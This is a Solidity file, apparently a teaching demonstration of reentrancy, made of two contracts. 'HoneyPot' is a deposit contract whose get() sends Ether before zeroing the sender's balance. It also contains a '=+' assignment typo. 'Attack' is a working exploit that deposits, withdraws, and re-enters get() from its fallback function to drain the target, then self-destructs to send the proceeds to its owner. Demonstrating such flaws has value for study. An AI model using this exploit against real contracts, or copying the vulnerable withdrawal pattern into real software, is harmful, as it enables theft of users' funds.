pragma solidity ^0.4.24;

contract HoneyPot {
    mapping (address => uint) public balances;

    event LogPut(address indexed who, uint howMuch);
    event LogGot(address indexed who, uint howMuch);

    constructor() payable public {
        put();
    }

    function put() payable public {
        emit LogPut(msg.sender, msg.value);
        balances[msg.sender] =+ msg.value;
    }

    function get() public {
        emit LogGot(msg.sender, balances[msg.sender]);
        require(msg.sender.call.value(balances[msg.sender])());
        balances[msg.sender] = 0;
    }

    function() private {
        revert();
    }
}

contract Attack{
    
    address public owner;
    HoneyPot public honeypot;

    constructor (address _honeypot) public {

        owner = msg.sender;
        honeypot = HoneyPot(_honeypot);
    }

    function initAttack() public payable{

        honeypot.put.value(msg.value)();
        honeypot.get();
    }

    function killSwitch() public returns(bool){

        require(msg.sender == owner);
        selfdestruct(owner);
        return true;
    }

    function () public payable{
        
        if(address(honeypot).balance > 0)
            honeypot.get();
    }
}